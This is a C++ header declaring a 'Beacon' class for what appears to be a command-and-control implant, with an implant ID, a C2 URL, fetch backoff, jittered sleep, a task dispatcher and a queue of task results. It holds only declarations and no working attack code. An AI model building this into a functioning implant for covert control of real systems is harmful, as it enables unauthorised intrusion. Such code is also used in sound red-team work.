#pragma once

#include <string>
#include <vector>
#include "../external/concurrentqueue/concurrentqueue.h"
#include "Task.h"
#include "TaskDispatcher.h"

namespace beacon {

struct Result {
    std::string task_id;
    std::string output;
    std::string error;
};

class Beacon {
public:
    Beacon();
    void run();

private:
    std::string implantId_;
    std::string c2Url_;
    double c2FetchBackoff_;
    moodycamel::ConcurrentQueue<Result> pendingResults_;
    std::vector<Result> inFlightResults_;
    TaskDispatcher taskDispatcher_;

    void sleepWithJitter();
};

} // namespace beacon
